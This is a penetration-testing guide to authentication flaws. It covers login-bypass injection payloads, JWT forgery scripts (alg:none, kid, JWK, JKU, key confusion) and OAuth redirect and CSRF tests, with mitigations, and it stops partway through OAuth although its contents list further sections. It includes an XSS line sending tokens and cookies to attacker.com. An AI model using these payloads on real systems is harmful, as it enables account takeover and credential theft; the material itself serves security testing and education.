# Authentication Testing Rules

> Comprehensive guide for testing authentication mechanisms across web applications and APIs.
> Covers: login bypass, JWT, OAuth 2.0/OIDC, SAML, MFA bypass, password reset, session management, rate limiting.

---

## Table of Contents

1. [Login Bypass Testing](#1-login-bypass-testing)
   - [SQL Injection Login Bypass](#11-sql-injection-login-bypass)
   - [NoSQL Injection Login Bypass](#12-nosql-injection-login-bypass)
   - [Parameter Pollution Login Bypass](#13-parameter-pollution-login-bypass)
   - [Mass Assignment / Type Confusion](#14-mass-assignment--type-confusion)
   - [LDAP Injection Login Bypass](#15-ldap-injection-login-bypass)
   - [XPath Injection Login Bypass](#16-xpath-injection-login-bypass)
   - [HTTP Verb Tampering](#17-http-verb-tampering)
   - [Default Credentials and Enumeration](#18-default-credentials--enumeration)
2. [JWT Attacks](#2-jwt-attacks)
   - [alg:none Attack](#21-algnone-attack)
   - [Weak HMAC Secret Brute Force](#22-weak-hmac-secret-brute-force)
   - [Kid Header Injection](#23-kid-header-injection)
   - [JWK Header Injection](#24-jwk-header-injection)
   - [RS256 to HS256 Algorithm Confusion](#25-rs256--hs256-algorithm-confusion)
   - [Claims Manipulation](#26-claims-manipulation)
   - [JWT Expiration Bypass](#27-jwt-expiration-bypass)
   - [JWT Injection via Sub/ISS](#28-jwt-injection-via-subiss)
   - [Token Sidejacking via XSS](#29-token-sidejacking-via-xss)
   - [JKU Header Injection](#210-jku-header-injection)
3. [OAuth 2.0 / OIDC Testing](#3-oauth-20--oidc-testing)
   - [Redirect URI Bypass](#31-redirect-uri-bypass)
   - [CSRF on OAuth Link (State Parameter)](#32-csrf-on-oauth-link-state-parameter)
   - [Authorization Code Interception](#33-authorization-code-interception)
   - [Token Theft via Referer Header](#34-token-theft-via-referer-header)
   - [Client Secret Leak / Scope Escalation](#35-client-secret-leak--scope-escalation)
   - [PKCE Downgrade Attack](#36-pkce-downgrade-attack)
   - [Open Redirect via OAuth Flow](#37-open-redirect-via-oauth-flow)
   - [Covert Redirect via Fragment](#38-covert-redirect-via-fragment)
   - [Implicit Grant Token Interception](#39-implicit-grant-token-interception)
   - [Refresh Token Reuse / Rotation Flaws](#310-refresh-token-reuse--rotation-flaws)
   - [OAuth Account Linking CSRF](#311-oauth-account-linking-csrf)
4. [SAML Attacks](#4-saml-attacks)
   - [XML Signature Wrapping (XSW1-XSW8)](#41-xml-signature-wrapping-xsw1xsw8)
   - [Comment Injection in NameID](#42-comment-injection-in-nameid)
   - [Signature Stripping](#43-signature-stripping)
   - [IdP Confusion / Key Confusion](#44-idp-confusion--key-confusion)
   - [Replay Attack](#45-replay-attack)
   - [Audience Restriction Bypass](#46-audience-restriction-bypass)
   - [XML External Entity (XXE) in SAML](#47-xml-external-entity-xxe-in-saml)
   - [XML Bombs (Billion Laughs) in SAML](#48-xml-bombs-billion-laughs-in-saml)
5. [MFA / 2FA Bypass (7 Patterns)](#5-mfa--2fa-bypass-7-patterns)
   - [Pattern 1: MFA Not Enforced on Sensitive Endpoints](#51-pattern-1-mfa-not-enforced-on-sensitive-endpoints)
   - [Pattern 2: MFA Step Skip via Direct Navigation](#52-pattern-2-mfa-step-skip-via-direct-navigation)
   - [Pattern 3: MFA Token Replay](#53-pattern-3-mfa-token-replay)
   - [Pattern 4: Brute-Force OTP](#54-pattern-4-brute-force-otp)
   - [Pattern 5: Race Condition on OTP Validation](#55-pattern-5-race-condition-on-otp-validation)
   - [Pattern 6: Recovery Code Dump via API](#56-pattern-6-recovery-code-dump-via-api)
   - [Pattern 7: Backup Factor Downgrade](#57-pattern-7-backup-factor-downgrade)
6. [Password Reset Flaws](#6-password-reset-flaws)
   - [Host Header Injection in Reset Link](#61-host-header-injection-in-reset-link)
   - [Predictable Reset Token](#62-predictable-reset-token)
   - [Token Leak in Referer Header](#63-token-leak-in-referer-header)
   - [Race Condition on Reset Link](#64-race-condition-on-reset-link)
   - [Token Not Invalidated After Use](#65-token-not-invalidated-after-use)
   - [User Enumeration via Reset Endpoint](#66-user-enumeration-via-reset-endpoint)
   - [Password Reset Poisoning via Email](#67-password-reset-poisoning-via-email)
7. [Session Testing](#7-session-testing)
   - [Session Fixation](#71-session-fixation)
   - [Session Prediction](#72-session-prediction)
   - [Concurrent Session Flaws](#73-concurrent-session-flaws)
   - [Session Invalidation on Logout](#74-session-invalidation-on-logout)
   - [Session Timeout Misconfiguration](#75-session-timeout-misconfiguration)
   - [Weak Session Cookie Attributes](#76-weak-session-cookie-attributes)
   - [Session Token in URL](#77-session-token-in-url)
8. [Rate Limit Testing on Auth Endpoints](#8-rate-limit-testing-on-auth-endpoints)
   - [Login Rate Limiting Bypass](#81-login-rate-limiting-bypass)
   - [OTP/Lockout Rate Limiting Bypass](#82-otplockout-rate-limiting-bypass)
   - [Password Reset Rate Limiting Bypass](#83-password-reset-rate-limiting-bypass)
   - [IP Rotation / Distributed Bypass](#84-ip-rotation--distributed-bypass)
   - [Header-Based Rate Limit Bypass](#85-header-based-rate-limit-bypass)
   - [Rate Limit Scoping Flaws](#86-rate-limit-scoping-flaws)
9. [Tooling and Automation](#9-tooling--automation)
10. [Cheat Sheet: Quick Reference](#10-cheat-sheet-quick-reference)

---

## 1. Login Bypass Testing

### 1.1 SQL Injection Login Bypass

**Root Cause:** User-supplied credentials are concatenated directly into SQL queries without parameterization.

**Classic Payload (Authentication Bypass):**
```
' OR '1'='1' --
' OR 1=1 --
' OR '1'='1' #
" OR 1=1 --
admin' --
admin' OR '1'='1
```

**Testing Steps:**

1. Submit single quote `'` in the username field and observe error message (SQL syntax error confirms injection point).
2. Submit classic bypass payload in username field with arbitrary password.
3. Test each input field independently: username, password, email, remember-me, API key.
4. Test JSON-based login endpoints (Content-Type: application/json).
5. Test URL-encoded and form-data formats.

**curl Examples:**

```
curl -X POST "https://target.com/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin'+OR+'1'%3D'1'--&password=anything"

curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'"'"' OR '"'"'1'"'"'='"'"'1", "password": "x"}'

curl -X POST "https://target.com/login" \
  -d "username=admin'--&password=x"

curl -X POST "https://target.com/login" \
  -d "username=' UNION SELECT 1,'admin','bypass'--&password=x"
```

**Request/Response Example:**

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' --&password=test

--- Response: 302 Found ---
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=authenticated_token
```

**Blind Injection (No Visible Error):**
```
-- Boolean-based blind
admin' AND 1=1--    (valid login)
admin' AND 1=2--    (invalid login, different response)

-- Time-based blind
admin' OR IF(1=1,SLEEP(5),0)--
```

**Detection Signatures:**
- SQL error messages (MySQL: `You have an error in your SQL syntax`, MSSQL: `Incorrect syntax near`, Oracle: `ORA-01756`, PostgreSQL: `ERROR: unterminated quoted string`)
- Different response times for time-based payloads
- Different response lengths for boolean blind payloads
- Successful 200/302 response with obvious bypass payload

**Mitigation:**
- Parameterized queries (prepared statements)
- Input validation whitelist
- Least-privilege database accounts

---

### 1.2 NoSQL Injection Login Bypass

**Root Cause:** Applications using MongoDB, Couchbase, or similar NoSQL databases pass JSON objects directly from user input without sanitization.

**Payloads for JSON endpoints (Content-Type: application/json):**
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
```

**Payloads for URL-encoded endpoints:**
```
username[$gt]=&password[$gt]=
username[$ne]=&password[$ne]=
username=$gt=""&password=$gt=""
username=admin&password[$exists]=true
username[$regex]=.*&password[$regex]=.*
```

**curl Examples:**

```
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

curl -X POST "https://target.com/login" \
  -d "username[$ne]=nonexistent&password[$ne]=test"

curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"$or": [{"username": "admin"}, {"username": {"$exists": false}}], "password": {"$ne": ""}}'
```

**Request/Response Examples:**

```
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": {"$gt": ""}, "password": {"$gt": ""}}

--- Response: 200 OK ---
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...
{"token": "eyJhbGciOiJIUzI1NiJ9...", "user": "admin"}
```

**NoSQL Boolean Injection:**
```
// True condition — should return success
{"username": "admin", "password": {"$ne": "wrong"}}

// False condition — should return failure
{"username": "nonexistent_user", "password": {"$ne": "wrong"}}
```

**Detection Signatures:**
- Login succeeds with obviously false credentials like `{"$gt": ""}`
- Different behavior between true and false conditions
- Error messages mentioning `MongoError`, `CastError`, `BSON`, `ObjectID`
- 500 errors when injecting operators into non-JSON fields

**Mitigation:**
- Reject keys starting with `$` in user input
- Use a whitelist of allowed fields
- Use a NoSQL ORM with type checking
- Validate that username/password are strings before querying

---

### 1.3 Parameter Pollution Login Bypass

**Root Cause:** Different frameworks handle multiple parameters with the same name differently. PHP uses the last value, ASP.NET concatenates with commas, Node.js (Express/qs) creates arrays, Java uses the first value.

**Testing Steps:**

1. Send multiple `username` or `password` parameters with different values.
2. Observe which value the application accepts (first, last, combined, array).
3. Craft bypass by exploiting the parser discrepancy.

**curl Examples:**

```
curl -X POST "https://target.com/login" \
  -d "username=invalid&username=admin&password=x"

curl -X POST "https://target.com/login" \
  -d "username=admin&username=invalid&password=x"

curl -X POST "https://target.com/login" \
  -d "username[]=admin&password=x"

curl -X POST "https://target.com/login" \
  -d "username=admin&username[$ne]=x&password=x"
```

**Request/Response Example:**

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=nonexistent&username=admin&password=x

--- Backend pseudocode (PHP): ---
$_POST['username'] = 'admin'  (last one wins)
```

**Chained with SQL Injection:**

```
curl -X POST "https://target.com/login" \
  -d "username=' OR 1=1--&username=admin&password=x"
```

**Detection:**
- Send two identical params with different values; check which one takes effect
- Monitor for 500 errors indicating confusion
- Check if response reflects the unexpected value

**Mitigation:**
- Reject requests with duplicate parameters
- Use consistent parameter parsing (first wins or reject)
- Validate and sanitize each parameter independently

---

### 1.4 Mass Assignment / Type Confusion

**Root Cause:** The application binds all request body fields to the user model, allowing attackers to set privileged fields.

**Testing Steps:**

1. Register a new user with extra fields: `is_admin`, `role`, `verified`, `email_verified`.
2. Observe if the server applies the supplied value.
3. Try boolean, integer, and string formats.

**curl Examples:**

```
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"P@ss1234","is_admin":true}'

curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"P@ss1234","role":"admin"}'

curl -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"P@ss1234","role_id":1}'

curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"P@ss1234","verified":true,"email_verified":true}'
```

**Request/Response Example:**

```
POST /api/register HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"attacker@test.com","password":"x","is_admin":true,"role":"superadmin"}

--- Response: 201 Created ---
HTTP/1.1 201 Created
{"id":123,"email":"attacker@test.com","is_admin":true,"role":"superadmin"}
```

**Profile Update Escalation:**
```
PUT /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <token>

{"name":"Attacker","is_admin":true,"credit":999999}
```

**Detection:**
- Check API documentation for all model fields
- Brute-force common privileged field names: `admin`, `isAdmin`, `is_admin`, `role`, `role_id`, `type`, `account_type`, `plan`, `tier`, `verified`, `email_verified`, `phone_verified`, `credit`, `balance`, `points`, `level`, `permissions`, `scope`, `group`, `groups`
- Add each one to a registration or profile update request
- Check if the new field appears in the response or takes effect

**Mitigation:**
- Use DTOs/ViewModels that whitelist allowed fields
- Never bind directly from request to entity model
- Explicitly set privileged fields in server-side code

---

### 1.5 LDAP Injection Login Bypass

**Root Cause:** User input is used in LDAP queries without sanitization.

**Payloads:**
```
*)(uid=*))(|(uid=*
*)(|(password=*)
*)(uid=*))(|(password=*
admin)(|(password=*
*)(|(uid=*
```

**curl Example:**
```
curl -X POST "https://target.com/login" \
  -d "username=*)(uid=*))(|(uid=*&password=x"
```

**Mitigation:**
- Escape LDAP special characters (`*`, `()`, `\`, `/`)
- Use parameterized LDAP queries

---

### 1.6 XPath Injection Login Bypass

**Payloads:**
```
' or '1'='1
' or 1=1 or '1'='1
' or true() or '
```

**Mitigation:**
- Use parameterized XPath queries
- Disable XPath extension functions

---

### 1.7 HTTP Verb Tampering

**Testing Steps:** Change HTTP method to bypass authentication gate.

**curl Examples:**
```
curl -X GET "https://target.com/admin/delete-user?user_id=123"

curl -X HEAD "https://target.com/admin/panel"

curl -X PUT "https://target.com/admin/users" \
  -H "Content-Type: application/json" \
  -d '{"username":"newadmin","password":"x","role":"admin"}'

curl -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

curl -X OPTIONS "https://target.com/admin/" -v
```

**Mitigation:**
- Enforce authentication on all HTTP methods
- Use attribute-based or method-based access control
- Restrict OPTIONS/TRACE on authenticated endpoints

---

### 1.8 Default Credentials and Enumeration

**Testing Steps:**

1. Try common default credentials (admin:admin, admin:password, root:root, test:test).
2. Try common usernames (admin, administrator, root, test, user, guest, info, support, api, sysadmin, dev, developer).
3. Observe response differences for existing vs non-existing users.

**curl Examples:**

```
curl -X POST "https://target.com/login" -d "username=admin&password=admin"
curl -X POST "https://target.com/login" -d "username=admin&password=password"
curl -X POST "https://target.com/login" -d "username=root&password=root"
curl -X POST "https://target.com/login" -d "username=test&password=test"

curl -X POST "https://target.com/login" -d "username=existing_user&password=wrong"
# Response: "Invalid password"

curl -X POST "https://target.com/login" -d "username=nonexistent_user&password=wrong"
# Response: "User not found"
```

**Mitigation:**
- Enforce password policies
- Return generic error messages
- Implement account lockout
- Disable default accounts

---

## 2. JWT Attacks

### 2.1 alg:none Attack

**Root Cause:** The server accepts tokens with `alg: "none"`, trusting unverified tokens.

**Testing Steps:**

1. Obtain a valid JWT from the target.
2. Decode it (base64url-decode the header and payload).
3. Modify the header to `{"alg":"none","typ":"JWT"}`.
4. Modify the payload with desired claims (admin:true, sub:admin).
5. Sign with empty signature (the trailing dot with nothing between).
6. Send the tampered token.

**curl Example:**

```
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ."

curl -X GET "https://target.com/api/admin" \
  -H "Authorization: Bearer $TOKEN"
```

**Request/Response Example:**

```
GET /api/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.

--- Response: 200 OK ---
HTTP/1.1 200 OK
{"users": [{"id":1,"email":"admin@target.com","role":"admin"}]}
```

**Variations:**
```
# Uppercase NONE
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.

# Mixed case (None, NONE, none, nOnE)
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.
```

**Detection:** A 401 becomes 200 after modifying to alg:none.

**Mitigation:** Reject tokens with `alg: none` at the library level. Validate algorithm against an explicit whitelist.

---

### 2.2 Weak HMAC Secret Brute Force

**Root Cause:** The JWT is signed with a weak or guessable HMAC secret.

**Testing Steps:**

1. Obtain a valid JWT (HS256/HS384/HS512 signed).
2. Use hashcat or jwt_tool to brute-force the secret.
3. Once the secret is found, forge arbitrary tokens.

**Tools:**

```
# jwt_tool — crack the secret
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# hashcat — mode 16500 for HMAC-SHA256
hashcat -m 16500 -a 0 <token> /usr/share/wordlists/rockyou.txt
```

**Common Weak Secrets to Test Manually:**
```
secret, Secret, SECRET, jwt, JWT, jwt_secret, JWT_SECRET, my_secret
password, password123, admin, key, private_key, token, TOKEN
super_secret, s3cr3t, changeme, test, development, production
```

**curl (after secret is known):**
```
python3 -c "
import jwt
token = jwt.encode({'sub':'admin','admin':True}, 'secret', algorithm='HS256')
print(token)
"

curl -X GET "https://target.com/api/admin" \
  -H "Authorization: Bearer <forged_token>"
```

**Mitigation:** Use strong random secrets (256-bit minimum). Use RS256/ES256 (asymmetric) instead of HS256. Rotate secrets periodically.

---

### 2.3 Kid Header Injection

**Root Cause:** The `kid` (Key ID) header is used to fetch a verification key from a path, database, or other source without proper sanitization, enabling path traversal or SQL injection.

**Attack Types:**
- Path traversal: `kid: ../../public/css/style.css` (file contents used as HMAC secret)
- SQL injection: `kid: ' UNION SELECT 'secret' --` (key fetched from DB)
- Command injection: `kid: $(cat /etc/passwd)`

**Testing Steps:**

1. Decode the JWT header and examine the `kid`, `jku`, or `x5u` fields.
2. Test path traversal by pointing `kid` to a known file.
3. Use the contents of that file as the HMAC secret to sign a forged token.

**Python Exploit Script:**

```python
import base64, json, hmac, hashlib

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

header = b64url({"alg":"HS256","typ":"JWT","kid":"../../dev/null"})
payload = b64url({"sub":"admin","admin":True})

# /dev/null is empty, so HMAC key is ""
message = f"{header}.{payload}".encode()
sig = base64.urlsafe_b64encode(hmac.new(b"", message, hashlib.sha256).digest()).decode().rstrip("=")

token = f"{header}.{payload}.{sig}"
print(token)
```

**SQLi via Kid:**

```
# If kid is used in SQL: SELECT key FROM jwt_keys WHERE kid='$input'
HEADER = {
  "alg": "HS256",
  "typ": "JWT",
  "kid": "' UNION SELECT 'known_secret' -- "
}
# The server will use 'known_secret' as the HMAC key
```

**Mitigation:** Validate and sanitize the `kid` value. Do not use user-controlled `kid` to read arbitrary files. Use a whitelist of allowed key identifiers.

---

### 2.4 JWK Header Injection

**Root Cause:** The JWT header contains a `jwk` (JSON Web Key) field, and the server trusts the embedded key to verify the signature without validating it against a trusted key store.

**Testing Steps:**

1. Generate your own RSA key pair.
2. Embed the public key in the `jwk` header field.
3. Sign the token with your private key.
4. Send the token to the server.

**Python Exploit Script:**

```python
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding, utils
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
import base64, json

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

pub_nums = public_key.public_numbers()
n = base64.urlsafe_b64encode(pub_nums.n.to_bytes(256, 'big')).decode().rstrip("=")
e = base64.urlsafe_b64encode(pub_nums.e.to_bytes(3, 'big')).decode().rstrip("=")

jwk = {"kty":"RSA","n":n,"e":e,"alg":"RS256"}

header = base64.urlsafe_b64encode(json.dumps({"alg":"RS256","jwk":jwk}).encode()).decode().rstrip("=")
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","admin":True}).encode()).decode().rstrip("=")
message = f"{header}.{payload}".encode()

signature = private_key.sign(message, padding.PKCS1v15(), utils.Prehashed(hashes.SHA256()))
sig = base64.urlsafe_b64encode(signature).decode().rstrip("=")

token = f"{header}.{payload}.{sig}"
print(token)
```

**curl Example:**
```
TOKEN="<output_from_above_script>"
curl -X GET "https://target.com/api/admin" -H "Authorization: Bearer $TOKEN"
```

**Mitigation:** Always validate the embedded JWK against a trusted key store. Do not accept arbitrary keys. Use JKU with HTTPS-only whitelist.

---

### 2.5 RS256 to HS256 Algorithm Confusion

**Root Cause:** The server uses asymmetric RS256 (RSA) for verification, but the JWT library treats `alg: HS256` the same way. Since the public key is sometimes known or obtainable, the attacker can use the public key as the HMAC secret to sign forged tokens.

**Prerequisites:**
1. Obtain the server's public key (often at `/.well-known/jwks.json`, `/jwks.json`, `/publickey`).
2. The JWT library must support both RS256 and HS256 via the same verification code path.

**Testing Steps:**

1. Fetch the server's public key.
2. Create a new JWT with `alg: HS256`.
3. Sign the payload using the public key bytes as the HMAC secret.
4. The server will verify using the public key (which it knows) and accept it.

**curl and Python Exploit:**

```bash
curl -s "https://target.com/.well-known/jwks.json" | jq '.keys[0]'
```

```python
import jwt, requests

jwks = requests.get("https://target.com/.well-known/jwks.json").json()
# Convert JWK to PEM (requires jwcrypto or similar)

public_key_pem = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"
forged = jwt.encode({"sub":"admin","admin":True}, public_key_pem, algorithm="HS256")
print(forged)
```

**Detection:** Server exposes JKU/JWKS endpoint with public keys. The server uses the same verification function for symmetric and asymmetric algorithms.

**Mitigation:** Always validate the algorithm against an explicit whitelist. Do not accept HS256 if the server expects RS256. Use separate verification methods for symmetric vs asymmetric algorithms.

---

### 2.6 Claims Manipulation

**Root Cause:** The server trusts JWT claims without proper validation, or the JWT is unsigned/unverified.

**Common Manipulated Claims:**

| Claim | Attack | Impact |
|-------|--------|--------|
| `sub` | Change to another user's ID | Impersonation |
| `name` | Change displayed name | XSS via reflected claim |
| `email` | Change to attacker's email | Account takeover |
| `admin` / `is_admin` | Set to true | Privilege escalation |
| `role` | Change to admin/root | Privilege escalation |
| `iat` / `nbf` | Move to future or past | Token reuse |
| `exp` | Set to far future | Token never expires |
| `iss` | Change to internal issuer | Bypass issuer validation |
| `aud` | Change to different endpoint | Cross-service access |
| `scope` | Add admin scopes | Privilege escalation |
| `jti` | Reuse known jti | Token replay |

**Testing Steps:**

1. Decode the JWT (base64url decode each segment).
2. Modify claims to escalate privileges.
3. Re-encode and send. If the token is not verified, you win.
4. If the token is signed, attempt alg:none or key confusion.

**curl Examples:**

```
# Original token decoded:
# {"alg":"HS256","typ":"JWT"}
# {"sub":"user123","role":"user","iat":1600000000}

# Modified token (unsigned — alg:none):
# {"alg":"none","typ":"JWT"}
# {"sub":"admin","role":"admin","iat":1600000000,"exp":9999999999}

curl -X GET "https://target.com/api/admin/users" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ."
```

**Mitigation:** Always verify JWT signatures. Never trust payload claims without verification. Validate `sub` against actual permissions.

---

### 2.7 JWT Expiration Bypass

**Root Cause:** Server does not validate the `exp` (expiration) claim.

**Testing Steps:**

1. Capture a valid JWT.
2. Decode and modify `exp` to `0` or a very large value.
3. Send the modified token after the original expiry time.
4. If accepted, the server does not validate expiration.

```
# Original: {"sub":"user","exp":1700000000}
# Modified: {"sub":"user","exp":9999999999}  (year 2286)

curl -X GET "https://target.com/api/account" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.signature"
```

**Mitigation:** Always validate `exp` and reject expired tokens. Set reasonable token lifetimes (15-60 minutes for access tokens).

---

### 2.8 JWT Injection via Sub/ISS

**Root Cause:** The `sub` (subject) or `iss` (issuer) claim is used unsafely in database queries or business logic, creating injection points.

**Testing Steps:**

1. If you can register or influence the `sub` or `iss`, try injection payloads.
2. Test for SQLi, NoSQLi, template injection, and path traversal in these fields.

```
curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- @test.com","password":"x"}'
```

**Mitigation:** Treat JWT claims as untrusted input. Validate and sanitize before use in queries or rendering.

---

### 2.9 Token Sidejacking via XSS

**Root Cause:** JWT stored in localStorage or sessionStorage without HttpOnly cookies is accessible to XSS attacks.

**Testing Steps:**

1. Identify if JWT is stored in localStorage, sessionStorage, or accessible via JavaScript.
2. If an XSS vulnerability exists, use payloads to steal the token.
3. Replay the token from an attacker-controlled machine.

**XSS Payload for Token Theft:**
```javascript
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
fetch('https://attacker.com/steal?token=' + sessionStorage.getItem('jwt'))
fetch('https://attacker.com/steal?token=' + document.cookie)
```

**curl Replay:**
```
curl -X GET "https://target.com/api/account" \
  -H "Authorization: Bearer <stolen_jwt>"
```

**Mitigation:** Use HttpOnly cookies for JWT storage. Use short-lived tokens with refresh token rotation. Implement CSP to prevent exfiltration.

---

### 2.10 JKU Header Injection

**Root Cause:** The JWT header contains a `jku` (JWK Set URL) field, and the server fetches the key from the attacker-controlled URL.

**Testing Steps:**

1. Host a JWKS endpoint on your server (e.g., `https://attacker.com/jwks.json`).
2. Forge a JWT with `jku` pointing to your server.
3. Sign the token with a private key whose corresponding public key is in your JWKS.
4. If the server fetches and trusts your key, you win.

**Attacker's JWKS Endpoint (`jwks.json`):**
```json
{
  "keys": [{
    "kty": "RSA",
    "use": "sig",
    "alg": "RS256",
    "kid": "attacker-key",
    "n": "your_rsa_modulus_base64",
    "e": "AQAB"
  }]
}
```

**Python Exploit:**
```python
import base64, json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding, utils

private_key = rsa.generate_private_key(65537, 2048)
public_key = private_key.public_key()

pub_nums = public_key.public_numbers()
n = base64.urlsafe_b64encode(pub_nums.n.to_bytes(256, 'big')).decode().rstrip("=")
e = base64.urlsafe_b64encode(pub_nums.e.to_bytes(3, 'big')).decode().rstrip("=")

header = {"alg": "RS256", "kid": "attacker-key", "jku": "https://attacker.com/jwks.json"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")

payload = {"sub": "admin", "admin": True}
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

message = f"{header_b64}.{payload_b64}".encode()
signature = private_key.sign(message, padding.PKCS1v15(), utils.Prehashed(hashes.SHA256()))
sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

token = f"{header_b64}.{payload_b64}.{sig_b64}"
print(token)
```

**curl:**
```
curl -X GET "https://target.com/api/admin" \
  -H "Authorization: Bearer $TOKEN"
```

**Mitigation:** Validate JKU URLs against a whitelist. Enforce HTTPS. Fetch the JWKS and validate the key's `kid` against the expected set.

---

## 3. OAuth 2.0 / OIDC Testing

### 3.1 Redirect URI Bypass

**Root Cause:** The authorization server does not properly validate the `redirect_uri` parameter, allowing attackers to redirect the authorization code or tokens to an attacker-controlled endpoint.

**Testing Steps:**

1. Start an OAuth authorization flow.
2. Intercept the request to the authorization endpoint.
3. Modify the `redirect_uri` to various attacker-controlled or unexpected values.
4. If the server accepts the modified `redirect_uri`, the authorization code or tokens will be sent there.

**Payloads to Test:**
```
https://target.com/callback               (valid)
https://target.com/callback.evil.com      (subdomain trick)
https://target.com/callback@evil.com      (credential-style URL)
https://target.com/callback#evil.com      (fragment)
https://evil.com/target.com/callback      (path traversal)
https://target.com:443/callback           (port variation)
http://target.com/callback               (http instead of https)
https://target.com/Callback              (case variation)
https://target.com/callback/extra         (extra path)
https://target.com/callback?x=evil        (query parameter)
https://target.com.evil.com/callback      (domain confusion)
https://target.com/callback%00.evil.com   (null byte)
```

**curl Example:**
```
curl -X GET "https://target.com/oauth/authorize?response_type=code&client_id=app1&redirect_uri=https://evil.com/callback&state=xyz" -L -v
```

**Request/Response Example:**

```
GET /oauth/authorize?response_type=code&client_id=abc123&redirect_uri=https://evil.com/steal&state=xyz HTTP/1.1
Host: auth.target.com

--- Response: 302 Found ---
HTTP/1.1 302 Found
Location: https://evil.com/steal?code=authorization_code_here&state=xyz
```

**Mitigation:** Use exact string matching for redirect URIs. Do not allow wildcard patterns. Validate against a registered whitelist. Reject URLs with `@` or `..` characters.

---

### 3.2 CSRF on OAuth Link (State Parameter)

**Root Cause:** The `state` parameter is missing, predictable (timestamp, sequential), or not validated on the callback, allowing CSRF attacks to link a victim's account to the attacker's OAuth provider identity.

**Testing Steps:**

1. Initiate an OAuth flow and capture the `state` parameter.
2. Check if `state` is a predictable value (sequential number, timestamp, hash of user-id).
3. Try reusing a `state` value from a different session.
4. Try omitting the `state` parameter entirely.

**curl Examples:**
```
curl -X GET "https://target.com/oauth/authorize?response_type=code&client_id=abc123&redirect_uri=https://target.com/callback"

curl -X GET "https://target.com/oauth/authorize?response_type=code&client_id=abc123&redirect_uri=https://target.com/callback&state=1001"

curl -X GET "https://target.com/oauth/callback?code=captured_code&state=known_state_value"
```

**Exploit HTML:**
```html
<img src="https://target.com/oauth/authorize?response_type=code&client_id=victim_client&redirect_uri=https://target.com/callback&state=12345" style="display:none"/>
```

**Mitigation:** Use cryptographically random, session-bound `state` parameter. Validate state on the callback endpoint. Use PKCE for native/mobile apps.

---

### 3.3 Authorization Code Interception

**Root Cause:** The authorization code is transmitted over an insecure channel (HTTP, referer header, log file) or can be guessed/predicted.

**Testing Steps:**

1. Examine the OAuth flow for code leakage channels.
2. Check if the code is in the URL fragment vs query string.
3. Check referer headers when the user-agent follows the redirect.
4. Check if codes are predictable (sequential, short, time-based).

**curl Examples:**
```
# Check code predictability
CODE1=$(curl -s "https://target.com/oauth/authorize?response_type=code&client_id=abc" | grep -oP 'code=\K[^&]+')
CODE2=$(curl -s "https://target.com/oauth/authorize?response_type=code&client_id=abc" | grep -oP 'code=\K[^&]+')
```

**Code Interception via Referer:**
```
Victim's browser flow:
1. Browser -> Auth Server: /authorize
2. Auth Server -> Browser: 302 Location: /callback?code=secret_code
3. Browser -> Target: GET /callback?code=secret_code
   Referer: https://auth.server.com/authorize?client_id=app
4. If target.com has an external resource, the Referer leaks the code.
```

